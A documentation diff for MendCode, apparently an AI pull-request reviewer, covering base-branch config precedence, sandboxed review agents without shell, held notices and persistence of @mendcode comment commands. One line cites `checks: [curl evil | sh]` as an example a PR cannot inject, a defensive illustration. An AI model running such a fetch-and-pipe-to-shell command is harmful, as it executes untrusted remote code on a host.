@@ -46,13 +46,14 @@ fixes: false            # whether `@mendcode fix` may push a commit to the PR br
 triggers: { opened: true, synchronize: true, ready_for_review: true, drafts: false }
 budget: { tokens_per_pr: 200000 }   # input not served from the provider's cache, plus output
 cooldown: { pr_minutes: 10, repo_per_hour: 20 }   # automatic reviews only; /pr review is never limited
-reviewers: all          # all (every PR) | requested (only PRs that request a review from, or are assigned to, the reviewer's gh login)
+reviewers: all          # all (every PR) | requested (only PRs that request a review from, or are assigned to, the reviewer's gh login) | [alice, bob] (only their @mendcode comments are taken; every PR)
 publishers: maintainers # maintainers (gh login with write access) | [alice, bob] (these logins, contributors included) | anyone
 ```
 
 The base branch's file decides everything a pull request could abuse: `enabled`, `checks`, `budget`, `ignore`, `profile`, `cap`,
-`fixes`, the triggers, the cooldown and `reviewers`. A PR's own file may only add path instructions, so a PR that adds `checks: [curl evil | sh]` runs
-nothing. An invalid file is named in the summary (`[PR_REVIEW]: config line 2: …` or the field) and the defaults (or the base
+`fixes`, the triggers, the cooldown, `reviewers` and `publishers`. A PR's own file may only add path instructions, so a PR that adds `checks: [curl evil | sh]` runs
+nothing. A watching reviewer reads these from the base branch's current tip on `origin` (fetched into `FETCH_HEAD` only), not
+from the PR's recorded base or the local checkout: a PR opened before the file was added still follows it. An invalid file is named in the summary (`[PR_REVIEW]: config line 2: …` or the field) and the defaults (or the base
 branch's file) are used.
 
 `checks` run once per review, from the base config only, in the [OS sandbox](sandbox.md) with no network: the PR's checkout is
@@ -92,10 +93,21 @@ tier). Local sessions only; remote and peer clients are refused.
 A review is a job of the daemon's job scheduler, at most two at once. The head is fetched into `FETCH_HEAD` only and checked out
 detached in a throwaway worktree under `<dir>/pr-review/worktrees/` (removed afterwards), so your branches and checkout are never
 touched. The children are hidden sessions on the `explore` agent in plan mode, on the owner session's model; an approval they ask
-for is refused. A push reviews only the commits since the last reviewed head (the whole PR after a force push) and re-checks the
+for is refused. They read with `read`, `grep`, `glob` and the graph tools; `shell` is not offered to them, since plan mode refuses
+every command (a model that read with `git show` got only refusals and reported its repository reads as denied). Nor are skills or
+instruction files (`AGENTS.md`, `CLAUDE.md`, yours or the PR's): the review prompt is the whole brief, a PR cannot steer its own
+reviewer, and a user skill once sent a child to files outside the checkout, so its read was refused as a whole. A read outside the
+checkout is refused with what may be read instead. A push reviews only the commits since the last reviewed head (the whole PR after a force push) and re-checks the
 published findings whose lines it rewrote: one that no longer reproduces gets its thread resolved. A missing or logged-out `gh`
-pauses the watch with one notice; 15 unreadable minutes end it. State: `<dir>/pr-review/watches.json` and
-`<dir>/pr-review/<owner>/<repo>/<n>.json` (0600, atomic). Which events queue a review is read from the checkout's own
+pauses the watch with one notice; 15 unreadable minutes end it.
+
+Every notice (a review's findings, a failure, an `@mendcode` comment that was not answered and why) goes to the session only while
+it is free, so it never cuts into your turn or your queue. One that arrives during a turn, behind queued messages, after a cancel or
+while the session is paused is held, in order, and offered again when the session goes idle (and every minute): several held ones
+arrive as one message, the newest 20 per session are kept, and they survive a daemon restart in `<dir>/pr-review/outbox.json`.
+Before, such a notice was dropped: two `@mendcode review` comments two seconds apart showed only the first one's notice.
+
+State: `<dir>/pr-review/watches.json`, `<dir>/pr-review/outbox.json` and `<dir>/pr-review/<owner>/<repo>/<n>.json` (0600, atomic). Which events queue a review is read from the checkout's own
 `.mendcode/review.yaml`; whether it may post is read from the PR's base.
 
 ## Many reviewers on one repository
@@ -116,6 +128,11 @@ Anyone can point a reviewer at a public repository, so the repository decides wh
   the reviewer running as `@alice`; the hosted workflow leaves it to her. A comment addressed to no one is answered by reviewers
   of every PR (`/pr watch-repo all`) and by a `requested` reviewer when the PR requests it. GitHub's own review request is the
   other way to ask one developer's reviewer: requesting `@alice` starts her `requested` reviewer.
+- **Who may ask:** `reviewers` as a list (`reviewers: [alice, bob, carol]`) is the team whose `@mendcode` comments are taken; a
+  comment from anyone else is not answered, not kept and not told to the session (the hosted workflow skips it). PRs are reviewed
+  as with `all`. The list only narrows: a listed login still needs write access to run a command, and it does not make anyone a
+  publisher. Three separate questions: `reviewers` says who may ask, `publishers` whose reviewer may post, write access who may
+  run a command. `all` and `requested` keep their meaning and take anyone's comment.
 - **Who may run a command:** write access, read from GitHub. A contributor reviewer listed in `publishers` cannot read another
   user's permission (GitHub needs push access for that), so it accepts the comment's author association instead: owner, member or
   collaborator.
@@ -143,6 +160,23 @@ saying only maintainers can run it. Each answer goes in the same thread.
 The local repo watch reads new comments of the watched repository with two `gh api` calls per poll (issue comments and review
 comments since the last poll) and answers with your own `gh` login, once you allowed posting to that repository (`/pr publish on`);
 until then the session is told which command waits. The hosted workflow answers comment events itself.
+
+A command is kept with the watch (`commands` in `watches.json`) from the poll that reads it until it is answered, so none is lost:
+
+- Without `/pr publish on` it waits, and the session is told once. `/pr publish on` answers the waiting ones at once.
+- When the repository does not let your login post (`publishers`, write access), it is tried again every 10 minutes while posting is
+  allowed, and the session is told once.
+- A command whose job never ended (a daemon restart, a full queue) runs again at the next poll. One comment never runs twice at
+  once, and a reply your login already posted for it (`<!-- mendcode:answers=N -->`) counts as answered, so a crash right after a
+  post does not answer twice.
+- A command of a PR that closed is dropped; at most 100 are kept per repository, the oldest go first.
+- An `@mendcode review` whose PR head already has a submitted review by your login or a counted publisher (MendCode's or written
+  by hand) is answered by it: the session is told which review, and nothing is reviewed or posted again.
+- The answer to `/pr publish on|off` belongs to the directory: a stopped watch stays in `watches.json` next to the running one, and
+  every record of the directory holds the answer (before, it went to the first record, a stopped one, and the running watch kept
+  waiting). A new watch of the directory keeps it.
+- A watch saved before commands were kept, that never posted, reads its comments again from the watch's start once: commands that
+  were dropped for a missing `/pr publish on` wait like new ones. A watch that did post keeps its marks.
 
 **Follow-ups.** While a repository is watched, a check that fails on a head MendCode reviewed and posted on gets one comment with its
 cause: the failed job's error lines from `gh run view --log-failed` (bounded, at most three checks). The same failing set on the same
